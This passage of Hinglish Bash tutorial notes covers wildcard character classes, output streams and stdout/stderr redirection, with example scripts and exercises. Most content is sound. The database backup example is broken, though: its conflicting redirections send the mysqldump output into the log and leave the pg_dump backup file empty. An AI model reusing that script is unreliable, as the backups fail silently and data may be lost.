INVALID_DIR="/uploads/invalid"

mkdir -p "$VALID_DIR" "$INVALID_DIR"

echo "Validating uploaded files..."

# Valid format: lowercase letters, digits, underscore, hyphen only
# Example: my_file-123.txt

for file in "$UPLOAD_DIR"/*; do
    [ -f "$file" ] || continue
    
    filename=$(basename "$file")
    name="${filename%.*}"
    
    # Check if name contains only valid characters
    if [[ "$name" =~ ^[[:lower:][:digit:]_-]+$ ]]; then
        echo "✓ Valid: $filename"
        mv "$file" "$VALID_DIR/"
    else
        echo "✗ Invalid: $filename (contains invalid characters)"
        mv "$file" "$INVALID_DIR/"
    fi
done

echo ""
echo "Validation complete!"
echo "Valid files: $(ls -1 "$VALID_DIR" 2>/dev/null | wc -l)"
echo "Invalid files: $(ls -1 "$INVALID_DIR" 2>/dev/null | wc -l)"
```

**Output:**
```
Validating uploaded files...
✓ Valid: my_document-2024.pdf
✓ Valid: report_final.txt
✗ Invalid: My Document.pdf (contains invalid characters)
✗ Invalid: file@123.txt (contains invalid characters)

Validation complete!
Valid files: 2
Invalid files: 2
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Double brackets bhoolna:** `[:alpha:]` galat - `[[:alpha:]]` sahi
- ❌ **`[a-z]` aur `[[:lower:]]` same samajhna:** Different locales mein alag ho sakte hain
- ❌ **Quotes mein use karna:** Globbing ke liye quotes nahi chahiye

### 10. **Best Practices / Pro Tips**
- 💡 **Production mein prefer karo:** `[[:lower:]]` > `[a-z]`
- 💡 **Combine karo:** `[[:alnum:]_-]` alphanumeric + underscore + hyphen
- 💡 **Regex mein bhi kaam karte hain:** `grep`, `sed`, `awk` mein use karo
- 💡 **Self-documenting:** Code zyada readable hota hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek security analyst hain aur log files mein suspicious usernames dhoondhni hain:

```bash
#!/bin/bash
# Suspicious username detector

LOG_FILE="/var/log/auth.log"
REPORT_FILE="/tmp/suspicious_users.txt"

echo "Analyzing authentication logs..."
echo "Suspicious Usernames Report" > "$REPORT_FILE"
echo "Generated: $(date)" >> "$REPORT_FILE"
echo "================================" >> "$REPORT_FILE"

# Valid usernames: lowercase letters, digits, underscore, hyphen
# Length: 3-16 characters

grep "Failed password" "$LOG_FILE" | \
    grep -oP 'user \K[^ ]+' | \
    sort -u | \
    while read username; do
        # Check if username is valid format
        if ! [[ "$username" =~ ^[[:lower:][:digit:]_-]{3,16}$ ]]; then
            echo "⚠️  Suspicious: $username" | tee -a "$REPORT_FILE"
            
            # Count attempts
            attempts=$(grep -c "user $username" "$LOG_FILE")
            echo "   Attempts: $attempts" | tee -a "$REPORT_FILE"
        fi
    done

echo ""
echo "Report saved to: $REPORT_FILE"
```

Yeh script automatically invalid username patterns detect karega jo attack attempts ho sakte hain.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `[[:alpha:]]` - Saare letters
- ✅ `[[:digit:]]` - Saare digits
- ✅ `[[:lower:]]` - Lowercase (locale-aware)
- ✅ `[[:upper:]]` - Uppercase (locale-aware)
- ✅ Production scripts mein prefer karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `[a-z]` aur `[[:lower:]]` mein kya fark hai?**
A: `[[:lower:]]` locale-aware hai aur international characters bhi include karta hai. `[a-z]` sirf ASCII letters.

**Q2: Kya character classes regex mein kaam karte hain?**
A: Haan! `grep`, `sed`, `awk` sabmein use kar sakte hain.

**Q3: Kya main multiple classes combine kar sakta hoon?**
A: Haan! `[[:alpha:][:digit:]_]` letters + digits + underscore.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch apple.txt Banana.txt 123.txt
touch file_test.txt File-Test.txt
touch "My File.txt"

# 2. Lowercase se shuru
ls [[:lower:]]*.txt

# 3. Uppercase se shuru
ls [[:upper:]]*.txt

# 4. Digit se shuru
ls [[:digit:]]*.txt

# 5. Alphanumeric se shuru
ls [[:alnum:]]*.txt

# 6. Test validation
for f in *.txt; do
    if [[ "$f" =~ ^[[:lower:][:digit:]_-]+\.txt$ ]]; then
        echo "Valid: $f"
    else
        echo "Invalid: $f"
    fi
done

# 7. Cleanup
rm *.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🌍 Character classes portable aur locale-aware hain
- 📚 Predefined sets: alpha, digit, lower, upper, space
- 🔒 Production code mein `[[:lower:]]` > `[a-z]`
- 🎯 Regex aur globbing dono mein kaam karte hain
- 💼 Professional scripting ka standard

> **💡 Ye Zaroor Yaad Rakhein:**
> Character classes professional scripting ka hallmark hain! Production scripts mein hamesha `[[:lower:]]`, `[[:digit:]]` jaise classes use karo - yeh portable, reliable, aur locale-aware hain!

---

# **🎉 Module 3 Complete! 🎉**

Congratulations! Aapne **Module 3: Pattern Matching (Wildcards)** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ Star Wildcard (`*`) - Unlimited characters match karna
✅ Question Mark (`?`) - Exactly ek character match karna
✅ Bracket Wildcards (`[abc]`, `[0-9]`, `[!abc]`) - Specific characters aur ranges
✅ Character Classes (`[[:alpha:]]`, `[[:digit:]]`) - Professional, portable patterns

## **Key Takeaways:**
- `*` - Sabse powerful, sabse flexible (0 to unlimited characters)
- `?` - Precision tool (exactly 1 character)
- `[...]` - Surgical control (specific characters/ranges)
- `[[:...]]` - Professional standard (portable, locale-aware)

## **Real-World Applications:**
- Bulk file operations (`*.txt`, `*.log`)
- Date-based file matching (`????-??-??`)
- Grade/category organization (`[A-F]`, `[0-9]`)
- Validation scripts (naming conventions)

## **Next Steps:**
Ab aap ready hain **Module 4: I/O Redirection & Piping** ke liye!

---

**📝 Practice Reminder:**
Wildcards ko master karne ka ek hi tarika hai - practice! Har din different patterns try karo. Pehle `ls` se test karo, phir actual commands use karo.

**⚠️ Safety Tip:**
Wildcards powerful hain lekin dangerous bhi! Hamesha:
1. Pehle `ls` se verify karo
2. Important files ka backup lo
3. `-i` (interactive) option use karo
4. `pwd` se location confirm karo

---

**🎯 Challenge:**
Ek script banao jo:
1. Saari `.txt` files ko dhoodhe
2. Sirf lowercase letters se shuru hone wali files select kare
3. Unhe date-wise folders mein organize kare
4. Summary report generate kare

Yeh challenge Module 3 ke saare concepts use karega!

---


=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 4)**

---

## **PART 1: THE ABSOLUTE BASICS (Shuruaat)**

---

# **Module 4: I/O Redirection & Piping**

---

## **Topic 1: Output Streams (`stdout` - 1, `stderr` - 2, `stdin` - 0)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Output Streams** - Linux mein data flow ke teen main channels samajhna.

### 2. **Ye Kya Hai? (What is it?)**
Linux mein har program ke paas teen standard streams hote hain: stdin (input lene ke liye), stdout (normal output ke liye), aur stderr (error messages ke liye). Har stream ka ek number hai: 0, 1, aur 2.

**Analogy:** Socho ki ek factory hai. stdin (0) raw material aane ka gate hai, stdout (1) finished products jaane ka gate hai, aur stderr (2) defective products alag jaane ka gate hai. Teen alag channels, teen alag purposes.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Output control** - Normal aur error output ko alag handle karna
- ✅ **Logging** - Errors ko alag file mein save karna
- ✅ **Debugging** - Errors ko easily identify karna
- ✅ **Automation** - Scripts mein proper error handling

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab errors aur normal output ko alag karna ho
- Log files banate waqt
- Scripts mein error handling ke liye
- Production environments mein debugging ke liye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Errors aur normal output mix ho jayenge
- Debugging mushkil hogi
- Log files messy rahenge
- Professional scripts nahi bana paoge

### 6. **Syntax aur Common Options**

```bash
# Stream numbers
0 = stdin  (Standard Input)
1 = stdout (Standard Output)
2 = stderr (Standard Error)

# Examples
command              # stdout aur stderr dono terminal par
command 1> file      # stdout ko file mein (1 optional hai)
command 2> file      # stderr ko file mein
command > file 2>&1  # Dono ko same file mein
```

**Important Concepts:**
- `0` - stdin (keyboard input)
- `1` - stdout (normal output)
- `2` - stderr (error messages)
- By default, dono terminal par dikhte hain

### 7. **Example 1 (Basic)**

```bash
# Normal command - stdout
$ echo "Hello World"
Hello World

# Error command - stderr
$ ls /nonexistent
ls: cannot access '/nonexistent': No such file or directory

# Dono ko dekho
$ ls file.txt /nonexistent
file.txt                                    # stdout
ls: cannot access '/nonexistent': ...       # stderr
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Backup script with proper stream handling

BACKUP_DIR="/backups"
LOG_FILE="/var/log/backup.log"
ERROR_FILE="/var/log/backup_errors.log"

echo "Starting backup at $(date)" >> "$LOG_FILE"

# Backup command
if tar -czf "$BACKUP_DIR/backup_$(date +%Y%m%d).tar.gz" /home 2>> "$ERROR_FILE"; then
    echo "✓ Backup successful" >> "$LOG_FILE"
else
    echo "✗ Backup failed - check $ERROR_FILE" >> "$LOG_FILE"
    exit 1
fi

echo "Backup completed at $(date)" >> "$LOG_FILE"
```

**Output:**
```
# LOG_FILE mein:
Starting backup at Mon Jan 15 10:30:00 2024
✓ Backup successful
Backup completed at Mon Jan 15 10:35:00 2024

# ERROR_FILE mein (agar errors hain):
tar: /home/user/locked_file: Cannot open: Permission denied
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Streams ko confuse karna:** stdout aur stderr dono terminal par dikhte hain, lekin alag hain
- ❌ **Error handling ignore karna:** Errors ko handle nahi karne se debugging mushkil
- ❌ **Stream numbers bhoolna:** `2>` stderr ke liye, `1>` stdout ke liye

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha errors log karo:** Production scripts mein `2>` use karo
- 💡 **Separate log files:** Normal aur error logs alag rakho
- 💡 **Testing:** `echo` stdout par jaata hai, error messages stderr par
- 💡 **Debugging:** `2>&1` se dono streams ko ek saath dekho

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek system administrator hain aur daily maintenance script chala rahe hain. Aapko normal output aur errors dono ko track karna hai:

```bash
#!/bin/bash
# Daily maintenance script

LOG_DIR="/var/log/maintenance"
DATE=$(date +%Y%m%d)

mkdir -p "$LOG_DIR"

# System updates - stdout aur stderr alag
{
    echo "=== System Update Started at $(date) ==="
    apt-get update
    apt-get upgrade -y
    echo "=== System Update Completed at $(date) ==="
} >> "$LOG_DIR/update_${DATE}.log" 2>> "$LOG_DIR/update_${DATE}_errors.log"

# Agar errors hain toh email bhejo
if [ -s "$LOG_DIR/update_${DATE}_errors.log" ]; then
    mail -s "Update Errors on $(hostname)" admin@example.com < "$LOG_DIR/update_${DATE}_errors.log"
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `0` = stdin (input), `1` = stdout (output), `2` = stderr (errors)
- ✅ By default dono terminal par dikhte hain
- ✅ Streams ko redirect karke control kar sakte hain
- ✅ Error handling ke liye stderr ko alag handle karo
- ✅ Professional scripts mein proper logging zaroori hai

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: stdout aur stderr mein kya fark hai?**
A: stdout normal output ke liye hai (jaise `echo`, `ls`). stderr error messages ke liye hai. Dono alag streams hain jo independently redirect ho sakte hain.

**Q2: Kaise pata chalega koi message stdout hai ya stderr?**
A: `command 2>/dev/null` chalaao. Agar message gayab ho gaya toh stderr tha, agar dikha toh stdout hai.

**Q3: Kya main stdin ko bhi redirect kar sakta hoon?**
A: Haan! `command < input.txt` se file se input le sakte hain.

### 14. **Practice ke liye Task**

```bash
# 1. Normal output dekho (stdout)
echo "This is stdout"

# 2. Error dekho (stderr)
ls /nonexistent

# 3. Dono ko ek saath
ls file.txt /nonexistent

# 4. Test karo - stderr ko hide karo
ls /nonexistent 2>/dev/null

# 5. Test karo - stdout ko hide karo
ls /nonexistent 1>/dev/null

# 6. Dono streams ko samjho
ls file.txt /nonexistent > output.txt 2> errors.txt
cat output.txt
cat errors.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔢 Teen streams: stdin (0), stdout (1), stderr (2)
- 📤 stdout normal output, stderr error messages
- 🎯 Dono independently redirect ho sakte hain
- 📝 Professional logging ke liye zaroori concept
- 🔧 Error handling ka foundation

> **💡 Ye Zaroor Yaad Rakhein:**
> Streams samajhna Linux ka fundamental concept hai! stdout (1) normal output, stderr (2) errors. Inhe alag handle karna professional scripting ki pehchan hai!

---

## **Topic 2: Redirecting Output (`>` overwrite, `>>` append)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Redirecting Output** - Terminal output ko files mein save karna.

### 2. **Ye Kya Hai? (What is it?)**
Output redirection aapko command ka output terminal par dikhane ki jagah file mein save karne deta hai. `>` file ko overwrite karta hai (purana data delete), `>>` file mein append karta hai (purane data ke saath add).

**Analogy:** Socho ki aap ek notebook mein notes likh rahe hain. `>` matlab pehle saare pages faad do aur naye se likho. `>>` matlab jo likha hai uske aage se likhte raho.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Data persistence** - Output ko save karke baad mein dekh sakte hain
- ✅ **Logging** - Scripts ka output log files mein save karna
- ✅ **Reports** - Automated reports generate karna
- ✅ **Backup** - Command outputs ko archive karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Log files banate waqt
- Reports generate karte waqt
- Command output ko save karna ho
- Scripts mein data collection ke liye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Output terminal par dikhe aur gayab ho jaye
- Important data save nahi ho payega
- Logs maintain nahi kar paoge
- Automation incomplete rahega

### 6. **Syntax aur Common Options**

```bash
# Overwrite (purana data delete)
command > file.txt

# Append (purane data ke saath add)
command >> file.txt

# Stdout explicitly
command 1> file.txt

# Create empty file
> file.txt

# Multiple redirections
command > output.txt 2> errors.txt
```

**Important Operators:**
- `>` - Overwrite (file ko replace kar do)
- `>>` - Append (file mein add karo)
- `1>` - Stdout redirect (1 optional)
- `2>` - Stderr redirect

### 7. **Example 1 (Basic)**

```bash
# Overwrite example
$ echo "First line" > file.txt
$ cat file.txt
First line

$ echo "Second line" > file.txt
$ cat file.txt
Second line                    # First line gayab!

# Append example
$ echo "First line" > file.txt
$ echo "Second line" >> file.txt
$ cat file.txt
First line
Second line                    # Dono lines hain!
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System health report generator

REPORT_FILE="/tmp/system_health_$(date +%Y%m%d).txt"

# Report header (overwrite)
{
    echo "================================"
    echo "   SYSTEM HEALTH REPORT"
    echo "   Generated: $(date)"
    echo "================================"
} > "$REPORT_FILE"

# Disk usage (append)
echo -e "\n=== DISK USAGE ===" >> "$REPORT_FILE"
df -h >> "$REPORT_FILE"

# Memory usage (append)
echo -e "\n=== MEMORY USAGE ===" >> "$REPORT_FILE"
free -h >> "$REPORT_FILE"

# CPU info (append)
echo -e "\n=== CPU INFO ===" >> "$REPORT_FILE"
lscpu | grep "Model name" >> "$REPORT_FILE"

# Uptime (append)
echo -e "\n=== SYSTEM UPTIME ===" >> "$REPORT_FILE"
uptime >> "$REPORT_FILE"

# Top processes (append)
echo -e "\n=== TOP 5 PROCESSES ===" >> "$REPORT_FILE"
ps aux --sort=-%mem | head -6 >> "$REPORT_FILE"

echo "Report generated: $REPORT_FILE"
cat "$REPORT_FILE"
```

**Output:**
```
Report generated: /tmp/system_health_20240115.txt
================================
   SYSTEM HEALTH REPORT
   Generated: Mon Jan 15 10:30:00 2024
================================

=== DISK USAGE ===
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   20G   28G  42% /

=== MEMORY USAGE ===
              total        used        free
Mem:           16Gi       8.0Gi       8.0Gi
...
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`>` aur `>>` confuse karna:** `>` data delete kar deta hai!
- ❌ **Important files overwrite karna:** Hamesha check karo file exist karti hai ya nahi
- ❌ **Permissions ignore karna:** File write permissions chahiye

### 10. **Best Practices / Pro Tips**
- 💡 **Pehli baar `>`, baaki `>>`:** Report start karo `>` se, baaki append karo `>>`
- 💡 **Backup lo:** Important files overwrite karne se pehle backup
- 💡 **Timestamps add karo:** Logs mein date/time zaroori hai
- 💡 **Empty file:** `> file.txt` se quickly empty file bana sakte hain

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek web developer hain aur deployment script bana rahe hain jo saare steps log kare:

```bash
#!/bin/bash
# Deployment script with logging

DEPLOY_LOG="/var/log/deploy_$(date +%Y%m%d_%H%M%S).log"
APP_DIR="/var/www/myapp"

# Start fresh log
echo "=== Deployment Started at $(date) ===" > "$DEPLOY_LOG"

# Git pull
echo "Pulling latest code..." >> "$DEPLOY_LOG"
cd "$APP_DIR"
git pull origin main >> "$DEPLOY_LOG" 2>&1

# Install dependencies
echo "Installing dependencies..." >> "$DEPLOY_LOG"
npm install >> "$DEPLOY_LOG" 2>&1

# Build
echo "Building application..." >> "$DEPLOY_LOG"
npm run build >> "$DEPLOY_LOG" 2>&1

# Restart service
echo "Restarting service..." >> "$DEPLOY_LOG"
systemctl restart myapp >> "$DEPLOY_LOG" 2>&1

# Final status
if systemctl is-active --quiet myapp; then
    echo "✓ Deployment successful!" >> "$DEPLOY_LOG"
    echo "✓ Deployment successful!"
else
    echo "✗ Deployment failed!" >> "$DEPLOY_LOG"
    echo "✗ Deployment failed! Check $DEPLOY_LOG"
    exit 1
fi

echo "=== Deployment Completed at $(date) ===" >> "$DEPLOY_LOG"
echo "Log file: $DEPLOY_LOG"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `>` file ko overwrite karta hai (purana data delete)
- ✅ `>>` file mein append karta hai (purane data ke saath)
- ✅ Pehli baar `>`, baaki `>>` use karo
- ✅ Timestamps hamesha add karo logs mein
- ✅ Permissions check karo file write karne se pehle

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Agar file exist nahi karti toh kya hoga?**
A: `>` aur `>>` dono nahi file create kar denge. Koi fark nahi padega.

**Q2: Kya main multiple commands ka output ek file mein daal sakta hoon?**
A: Haan! Pehli command `>` se, baaki `>>` se. Ya `{ cmd1; cmd2; } > file` use karo.

**Q3: Accidental overwrite se kaise bachun?**
A: `set -o noclobber` use karo. Phir `>` existing files overwrite nahi karega. Force karne ke liye `>|` use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Simple overwrite
echo "Line 1" > test.txt
cat test.txt

# 2. Overwrite again (data lost!)
echo "Line 2" > test.txt
cat test.txt

# 3. Append practice
echo "Line 1" > test.txt
echo "Line 2" >> test.txt
echo "Line 3" >> test.txt
cat test.txt

# 4. Command output save
ls -la > directory_listing.txt
cat directory_listing.txt

# 5. Multiple commands
{
    echo "=== System Info ==="
    uname -a
    echo "=== Date ==="
    date
} > system_info.txt
cat system_info.txt

# 6. Cleanup
rm test.txt directory_listing.txt system_info.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📝 `>` output ko file mein save karta hai (overwrite)
- ➕ `>>` output ko file mein add karta hai (append)
- 🔄 Pehli baar `>`, phir `>>` use karo
- ⚠️ `>` se data loss ho sakta hai - careful!
- 📊 Logging aur reporting ka foundation

> **💡 Ye Zaroor Yaad Rakhein:**
> `>` dangerous hai - purana data delete kar deta hai! Important files ke liye hamesha `>>` prefer karo ya pehle backup lo. Production mein `set -o noclobber` use karo safety ke liye!

---

## **Topic 3: Redirecting Error (`2>`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Redirecting Error** - Error messages ko alag file mein save karna.

### 2. **Ye Kya Hai? (What is it?)**
`2>` operator stderr (error stream) ko redirect karta hai. Isse aap error messages ko normal output se alag karke handle kar sakte hain - ek file mein errors, doosri mein normal output.

**Analogy:** Socho ki ek factory mein do conveyor belts hain - ek par acchi products (stdout), doosri par defective products (stderr). `2>` defective products ko alag warehouse mein bhejta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Error tracking** - Sirf errors ko monitor karna
- ✅ **Clean logs** - Normal aur error logs alag
- ✅ **Debugging** - Errors ko easily identify karna
- ✅ **Alerting** - Error files ko monitor karke alerts bhejana

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Production scripts mein error logging
- Debugging karte waqt
- Automated monitoring systems mein
- Jab errors aur normal output ko alag handle karna ho

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Errors normal output mein mix ho jayenge
- Error tracking mushkil hogi
- Debugging time waste hoga
- Production issues detect karna mushkil

### 6. **Syntax aur Common Options**

```bash
# Stderr ko file mein
command 2> errors.txt

# Stderr append
command 2>> errors.txt

# Stderr ko /dev/null (discard)
command 2>/dev/null

# Stdout aur stderr alag files mein
command > output.txt 2> errors.txt

# Stderr ko stdout mein merge
command 2>&1
```

**Important Patterns:**
- `2>` - Stderr redirect (overwrite)
- `2>>` - Stderr redirect (append)
- `2>&1` - Stderr ko stdout mein merge
- `2>/dev/null` - Errors discard karo

### 7. **Example 1 (Basic)**

```bash
# Normal command - no errors
$ ls file.txt > output.txt 2> errors.txt
$ cat output.txt
file.txt
$ cat errors.txt
(empty)

# Command with errors
$ ls /nonexistent > output.txt 2> errors.txt
$ cat output.txt
(empty)
$ cat errors.txt
ls: cannot access '/nonexistent': No such file or directory

# Mixed - some files exist, some don't
$ ls file.txt /nonexistent > output.txt 2> errors.txt
$ cat output.txt
file.txt
$ cat errors.txt
ls: cannot access '/nonexistent': No such file or directory
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Batch file processor with error handling

INPUT_DIR="/data/input"
OUTPUT_DIR="/data/output"
ERROR_LOG="/var/log/processor_errors.log"
SUCCESS_LOG="/var/log/processor_success.log"

mkdir -p "$OUTPUT_DIR"

# Clear old error log
> "$ERROR_LOG"

echo "Processing files from $INPUT_DIR..."

for file in "$INPUT_DIR"/*.txt; do
    [ -f "$file" ] || continue
    
    filename=$(basename "$file")
    echo "Processing: $filename"
    
    # Process file - errors ko alag log karo
    if process_command "$file" > "$OUTPUT_DIR/$filename" 2>> "$ERROR_LOG"; then
        echo "✓ $filename processed successfully" >> "$SUCCESS_LOG"
    else
        echo "✗ $filename failed - check error log" >> "$SUCCESS_LOG"
    fi
done

# Check if any errors occurred
if [ -s "$ERROR_LOG" ]; then
    echo "⚠️  Errors occurred during processing!"
    echo "Error count: $(wc -l < "$ERROR_LOG")"
    echo "Check: $ERROR_LOG"
    
    # Send alert email
    mail -s "Processing Errors on $(hostname)" admin@example.com < "$ERROR_LOG"
else
    echo "✓ All files processed successfully!"
fi
```

**Output:**
```
Processing files from /data/input...
Processing: file1.txt
Processing: file2.txt
Processing: file3.txt
⚠️  Errors occurred during processing!
Error count: 2
Check: /var/log/processor_errors.log
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`2>` aur `>2` confuse karna:** `2>` sahi hai, `>2` galat
- ❌ **Space dena:** `2 >` galat - `2>` sahi (no space)
- ❌ **Order galat:** `2>&1 > file` galat - `> file 2>&1` sahi

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha error logs maintain karo:** Production mein zaroori
- 💡 **Timestamps add karo:** `date` command se error logs mein time add karo
- 💡 **Error log size monitor karo:** Bahut badi na ho jaye
- 💡 **Empty error logs check karo:** `[ -s error.log ]` se check karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek DevOps engineer hain aur nightly backup script chala rahe hain:

```bash
#!/bin/bash
# Nightly backup with comprehensive error logging

BACKUP_DIR="/backups"
ERROR_LOG="/var/log/backup_errors_$(date +%Y%m%d).log"
SUCCESS_LOG="/var/log/backup_success_$(date +%Y%m%d).log"

# Directories to backup
DIRS=("/home" "/etc" "/var/www")

echo "=== Backup Started at $(date) ===" > "$SUCCESS_LOG"
> "$ERROR_LOG"

for dir in "${DIRS[@]}"; do
    echo "Backing up: $dir" >> "$SUCCESS_LOG"
    
    # Backup with error logging
    if tar -czf "$BACKUP_DIR/$(basename $dir)_$(date +%Y%m%d).tar.gz" "$dir" \
        >> "$SUCCESS_LOG" 2>> "$ERROR_LOG"; then
        echo "✓ $dir backup successful" >> "$SUCCESS_LOG"
    else
        echo "✗ $dir backup failed!" >> "$SUCCESS_LOG"
    fi
done

echo "=== Backup Completed at $(date) ===" >> "$SUCCESS_LOG"

# Error notification
if [ -s "$ERROR_LOG" ]; then
    {
        echo "Backup completed with errors!"
        echo "Error log:"
        cat "$ERROR_LOG"
    } | mail -s "Backup Errors - $(hostname)" admin@example.com
    
    exit 1
else
    echo "✓ All backups completed successfully!"
    exit 0
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `2>` stderr ko redirect karta hai
- ✅ `2>>` stderr ko append karta hai
- ✅ `2>&1` stderr ko stdout mein merge karta hai
- ✅ `2>/dev/null` errors ko discard karta hai
- ✅ Production mein error logging mandatory hai

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `2>&1` kaise kaam karta hai?**
A: Yeh stderr (2) ko stdout (1) mein redirect kar deta hai. Dono streams ek ho jaate hain.

**Q2: `> file 2>&1` aur `2>&1 > file` mein kya fark hai?**
A: Order matter karta hai! `> file 2>&1` sahi hai (pehle stdout redirect, phir stderr merge). `2>&1 > file` galat result dega.

**Q3: Kya main stderr ko ek file mein aur stdout ko doosri mein bhej sakta hoon?**
A: Haan! `command > output.txt 2> errors.txt` - dono alag files mein jayenge.

### 14. **Practice ke liye Task**

```bash
# 1. Create test files
touch existing.txt

# 2. Command with no errors
ls existing.txt > out.txt 2> err.txt
cat out.txt
cat err.txt

# 3. Command with errors
ls nonexistent.txt > out.txt 2> err.txt
cat out.txt
cat err.txt

# 4. Mixed command
ls existing.txt nonexistent.txt > out.txt 2> err.txt
cat out.txt
cat err.txt

# 5. Discard errors
ls nonexistent.txt 2>/dev/null

# 6. Merge streams
ls existing.txt nonexistent.txt > combined.txt 2>&1
cat combined.txt

# 7. Cleanup
rm existing.txt out.txt err.txt combined.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🚨 `2>` stderr (errors) ko redirect karta hai
- 📁 Error logs alag rakhna professional practice hai
- 🔀 `2>&1` se streams merge kar sakte hain
- 🗑️ `2>/dev/null` unwanted errors hide karta hai
- 🎯 Production scripts mein error handling mandatory

> **💡 Ye Zaroor Yaad Rakhein:**
> Error handling professional scripting ki pehchan hai! Hamesha `2>` use karke errors ko alag log karo. Production mein error logs monitor karo aur alerts setup karo!

---

## **Topic 4: Redirecting Both (`&>`, `> output.txt 2> error.txt`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Redirecting Both Streams** - stdout aur stderr dono ko ek saath handle karna.

### 2. **Ye Kya Hai? (What is it?)**
Jab aapko stdout aur stderr dono ko redirect karna ho - ya toh ek hi file mein ya alag-alag files mein - tab yeh techniques use hoti hain. `&>` dono ko ek file mein bhejta hai, jabki separate redirection se alag files mein bhej sakte hain.

**Analogy:** Socho ki factory ke do conveyor belts hain. Ek option hai dono ko ek hi truck mein load karo (`&>`), doosra option hai alag-alag trucks mein bhejo (`> file1 2> file2`).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Complete logging** - Kuch bhi miss nahi hota
- ✅ **Flexibility** - Ek saath ya alag, choice aapki
- ✅ **Debugging** - Poora picture dekhna
- ✅ **Production scripts** - Comprehensive output capture

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab complete output chahiye (success + errors)
- Log files banate waqt
- Debugging sessions mein
- Cron jobs mein (output capture ke liye)

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Output incomplete rahega
- Debugging mein information miss hogi
- Production issues track karna mushkil
- Logs incomplete rahenge

### 6. **Syntax aur Common Options**

```bash
# Dono ek file mein (shorthand)
command &> file.txt

# Dono ek file mein (explicit)
command > file.txt 2>&1

# Dono alag files mein
command > output.txt 2> errors.txt

# Dono append
command >> output.txt 2>> errors.txt

# Dono ek file mein append
command &>> file.txt
```

**Important Patterns:**
- `&>` - Dono streams ek file mein (Bash 4+)
- `> file 2>&1` - Dono streams ek file mein (portable)
- `> out.txt 2> err.txt` - Alag files mein
- `&>>` - Dono append (Bash 4+)

### 7. **Example 1 (Basic)**

```bash
# Dono ek file mein
$ ls file.txt /nonexistent &> combined.txt
$ cat combined.txt
file.txt
ls: cannot access '/nonexistent': No such file or directory

# Dono alag files mein
$ ls file.txt /nonexistent > output.txt 2> errors.txt
$ cat output.txt
file.txt
$ cat errors.txt
ls: cannot access '/nonexistent': No such file or directory

# Portable syntax
$ ls file.txt /nonexistent > combined.txt 2>&1
$ cat combined.txt
file.txt
ls: cannot access '/nonexistent': No such file or directory
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Database backup with comprehensive logging

DB_NAME="production_db"
BACKUP_DIR="/backups/database"
LOG_DIR="/var/log/db_backup"
DATE=$(date +%Y%m%d_%H%M%S)

mkdir -p "$BACKUP_DIR" "$LOG_DIR"

COMBINED_LOG="$LOG_DIR/backup_${DATE}_combined.log"
OUTPUT_LOG="$LOG_DIR/backup_${DATE}_output.log"
ERROR_LOG="$LOG_DIR/backup_${DATE}_errors.log"

echo "=== Database Backup Started at $(date) ===" | tee -a "$COMBINED_LOG"

# Method 1: Dono ek file mein
mysqldump -u root -p"$DB_PASS" "$DB_NAME" > "$BACKUP_DIR/${DB_NAME}_${DATE}.sql" \
    &>> "$COMBINED_LOG"

# Method 2: Alag-alag files mein (better for analysis)
pg_dump "$DB_NAME" > "$BACKUP_DIR/${DB_NAME}_${DATE}.sql" \
    2> "$ERROR_LOG" \
    1> "$OUTPUT_LOG"

# Check results
if [ -s "$ERROR_LOG" ]; then
    echo "⚠️ Backup completed with errors!" | tee -a "$COMBINED_LOG"
    echo "Check: $ERROR_LOG"
    exit 1
else
